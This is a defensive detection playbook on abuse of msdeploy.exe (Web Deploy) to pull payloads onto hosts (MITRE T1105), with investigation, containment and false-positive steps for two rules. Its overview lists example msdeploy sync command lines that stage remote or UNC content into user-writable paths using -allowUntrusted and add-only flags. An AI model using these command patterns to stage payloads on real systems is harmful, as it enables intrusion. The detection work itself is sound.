# T1105 — Ingress Tool Transfer · LOLBin: msdeploy.exe (Web Deploy)
**Rules:**  
- CNC-E-2726320-201 — msdeploy Ingress Transfer (Process Creation)  
- CNC-E-2726320-202 — msdeploy Outbound (Sysmon EID 3)  
**Last updated:** 2025-10-28 06:35 UTC

> `msdeploy.exe` (Web Deploy) synchronizes web content/config between sources and destinations (local ↔ remote). Legitimate use targets IIS
> sites and apps; adversaries can abuse its **sync/package** capabilities to **pull files from remote endpoints** into **user‑writable**
> paths, staging payloads via a Microsoft‑signed binary (**T1105 — Ingress Tool Transfer**). Remote endpoints may be accessed over **WMSVC (TCP 8172/HTTPS)**
> or the **Web Deployment Agent Service (msdepsvc, often TCP 80/HTTP)**, as well as UNC paths when used locally.

---

## Playbook 1 — msdeploy Ingress Transfer (Process Creation)

### Overview
This playbook investigates **process creation** events where **`msdeploy.exe`** runs with **sync/package providers** that imply **download/staging**
to the local host. Common abusive patterns include `-verb:sync` with **source** set to a **remote service/package/UNC** and **dest** set to a
**local dirPath/contentPath**. Examples to flag conceptually:
- `msdeploy -verb:sync -source:contentPath=\\host\share\path -dest:contentPath=C:\\Users\\<user>\\AppData\\Local\\Temp`
- `msdeploy -verb:sync -source:package=C:\\path\\remote.zip -dest:dirPath=C:\\staging`
- `msdeploy -verb:sync -source:iisApp="wmsvc:https://remote:8172/…" -dest:dirPath=C:\\staging -allowUntrusted`
- `-enableRule:DoNotDelete`, `-skip:objectName=dirPath,absolutePath=.*` used to **only add** new files (payload staging).

### Initial Response
1. **Preserve context:** Export **Sysmon EID 1 / Security 4688**: `Image`, full `CommandLine`, `ParentImage`, `User`, integrity level, working dir, timestamp.  
2. **Parse providers/args:** Extract **`-verb`**, **`-source:`**/**`-dest:`** providers (e.g., `contentPath`, `dirPath`, `package`, `iisApp`, `manifest`).  
3. **Secure artifacts:** Snapshot the **destination directory** and **new files** (hashes, sizes, ACLs). Avoid executing any content.

### Investigation Steps
#### 1) Process & Lineage
- Validate `Image` path (`C:\\Program Files\\IIS\\Microsoft Web Deploy V*\\msdeploy.exe`) and signature.  
- Review `ParentImage` (PowerShell/cmd/Office/scheduler/installer) to identify the initial vector.  
- Note **credential** flags (`-setParam:name=…`, `-authType=basic|ntlm`, `-userName`, `-password` obfuscations) and **`-allowUntrusted`**.

#### 2) Provider Semantics
- **Remote service**: `source:iisApp`/`appHostConfig` pointing to **WMSVC 8172** or **msdepsvc (80)** URIs.  
- **Package/manifest**: `source:package=<file>` or `source:manifest=<file>` (may themselves be sourced from remote/UNC).  
- **UNC/Local copy**: `source:dirPath`/`contentPath` on **\\host\share** → local **dest:dirPath/contentPath**.  
- **Selective sync**: `-skip`/`-useCheckSum`/`-enableRule` that limit deletion and favor one‑way **ingress**.

#### 3) Artifact & Content Analysis
- Hash new files; determine **true type** (PE, script, DLL, archive).  
- Check **extension ↔ MIME** mismatch, **entropy**, and suspicious **strings/URLs**.  
- Inspect **timestamps** (back‑dated files can blend into web roots).

#### 4) Network & DNS Corroboration
- Correlate with **EID 3** for connections to **8172/443** (WMSVC) or **80** (msdepsvc/HTTP) and **EID 22** for DNS.  
- Review **proxy** logs for **HTTP(S)** package fetches; for UNC sources, validate **SMB 445** sessions and **logon type 3** events.

#### 5) Correlation & Follow‑On
- Hunt for **execution** of staged files (PowerShell, w3wp.exe child loads, rundll32, mshta).  
- Pivot fleet‑wide on **command‑line substrings**, **dest path**, and **hashes**.

### Key Artifacts
- **Sysmon EID 1 / 4688:** `Image=...\\msdeploy.exe` with full `CommandLine` (providers, URIs).  
- **Sysmon EID 11:** Newly written files under the destination path.  
- **Sysmon EID 3 / Proxy:** Outbound connections to remote services or package hosts.  
- **Sysmon EID 22:** DNS lookups aligned with execution.  
- **SMB logs:** If UNC sources were used.

### Containment Actions
- **Quarantine** staged files; **block** remote endpoints/accounts; **terminate** activity; consider **host isolation** if execution occurred.

### Prevention Measures
- Restrict `msdeploy.exe` to **server admins** and **build agents**; apply **AppLocker/WDAC**.  
- Enforce **egress control** to WMSVC/msdepsvc only for approved servers; disable **WebClient** if unused.  
- Monitor for **rare process → dirPath/contentPath** writes under **user‑writable** locations.

### Recovery
- Remove payloads/persistence; rotate any credentials used; tune detections and allowlists; document deviations.

### False Positives
- Legitimate **web deployment** to approved IIS servers or from sanctioned build pipelines. Validate via tickets and CI/CD records.

---

## Playbook 2 — msdeploy Outbound (Sysmon EID 3)

### Overview
This playbook investigates **outbound connections** attributed to `msdeploy.exe`. In many environments, `msdeploy` should talk only to **known
deployment endpoints**. Egress to **new/rare hosts**, **raw IPs**, or unexpected **ports** suggests **T1105** staging.

### Initial Response
1. **Capture records:** Export **EID 3** (dest IP/host/port/proto) and correlate nearby **EID 1/4688** for `msdeploy.exe`.  
2. **Classify destination:** Internal vs external; highlight **8172/443** (WMSVC), **80** (msdepsvc/HTTP), **445** (if UNC copy), or **non‑standard ports**.  
3. **Scope usage:** Determine if the asset/user is part of **deployment roles**; if not, treat as high priority.

### Investigation Steps
#### 1) Process & Command Context
- Retrieve the exact **`-verb`/providers** and URIs from the `CommandLine`.  
- Identify **dest path** written to (if any) and **package/manifest** references.

#### 2) Destination Validation
- For **WMSVC (8172/HTTPS)**: Verify **server cert** usage; check **proxy** logs for SNI/Host; look for **`-allowUntrusted`** in CLI.  
- For **msdepsvc (HTTP/80)**: Review **proxy**/firewall logs (methods/status/bytes).  
- For **UNC/SMB (445)** sources: Validate SMB sessions and enumerate shares/paths accessed.

#### 3) Artifact Discovery
- Search for **EID 11** file writes to the specified local dest; hash/analyze new files.  
- Inspect web roots or user temp paths for newly landed content.

#### 4) Correlation & Fleet
- Pivot on **destination**, **CLI substrings**, **hashes**, and **dest paths** across endpoints to find spread/pattern reuse.

### Key Artifacts
- **Sysmon EID 3:** `Image=...\\msdeploy.exe`, destination IP/host/port.  
- **Sysmon EID 1 / 4688:** Creation context and full CLI.  
- **Sysmon EID 11:** New file writes near the time of egress.  
- **Sysmon EID 22 / Proxy:** DNS and HTTP(S) observables.  
- **SMB telemetry:** If UNC was involved.

### Containment Actions
- **Block** suspicious endpoints; **disable** compromised deployment creds; **terminate** activity; consider **host isolation** on execution.

### Prevention Measures
- Network ACLs limiting **msdeploy** to approved servers; **application control** for developer workstations.  
- Alert on **rare process → 8172/80/445** connections from non‑server assets and on **`-allowUntrusted`** usage.

### Recovery
- Remove staged artifacts/persistence; rotate credentials; tune detections and runbooks.

### False Positives
- CI/CD pipelines or legitimate admin tasks deploying to sanctioned IIS endpoints. Mitigate with allowlists and role‑based scopes.